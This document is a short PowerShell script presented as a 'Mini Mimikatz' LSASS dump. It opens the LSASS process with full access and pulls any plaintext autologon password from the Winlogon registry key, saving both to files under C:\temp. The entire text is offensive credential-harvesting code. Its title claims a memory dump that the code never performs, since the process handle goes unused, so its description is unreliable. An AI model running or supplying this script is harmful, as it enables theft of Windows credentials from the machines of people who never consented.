# Mini Mimikatz - LSASS Dump without DLLs
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
}
"@

# Target LSASS
$lsass = Get-Process lsass
$handle = [Win32]::OpenProcess(0x001F0FFF, $false, $lsass.Id)
Write-Output "LSASS PID: $($lsass.Id)" | Out-File "C:\temp\lsass.txt"

# Registry secrets (AUTOLOGON)
$auto = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue
if ($auto.DefaultPassword) { "AUTO_LOGIN_PASSWORD: $($auto.DefaultPassword)" | Out-File "C:\temp\autologon.txt" }
